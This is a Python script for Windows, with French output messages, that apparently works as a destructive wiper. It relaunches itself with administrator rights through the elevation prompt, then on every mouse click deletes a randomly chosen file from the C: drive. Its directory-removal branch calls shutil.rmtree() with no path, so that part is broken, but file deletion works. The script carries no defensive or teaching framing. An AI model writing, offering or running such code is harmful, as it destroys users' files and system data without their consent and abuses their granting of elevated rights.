import os, glob, random, pynput, ctypes, sys, shutil
from colored import fg, attr, bg


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin(): 
    
    def on_click(x, y, button, pressed):
        
        if pressed:
            
            pctodel = 0
            path = "C:"
            
            while True:
                
                path = random.choice(glob.glob(f"{path}/*"))
                
                if os.path.isdir(path):
                    
                    if len(path) == 0:
                        pctodel = 0
                        path = random.choice(glob.glob("C:/*"))
                        continue
                    
                    rdprcnt = random.random()
                    if rdprcnt < pctodel: 
                        try: 
                            path = path.replace("\\", "/")
                            shutil.rmtree()
                            print(f"{fg(1)}Dossier supprimé :{attr(1)} {fg(3)}{path}{attr(0)}")
                        except:
                            pctodel = 0
                            path = random.choice(glob.glob("C:/*"))
                            continue
                        break
                    
                    pctodel += 0.1
                    
                else:
                    try: 
                        path = path.replace("\\", "/")
                        os.remove(path)
                        print(f"{fg(1)}Fichier supprimé :{attr(1)} {fg(4)}{path}{attr(0)}")
                    except:
                        pctodel = 0
                        path = random.choice(glob.glob("C:/*"))
                        continue
                    break         


    with pynput.mouse.Listener(on_click=on_click) as listener:
        listener.join()
        
        
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
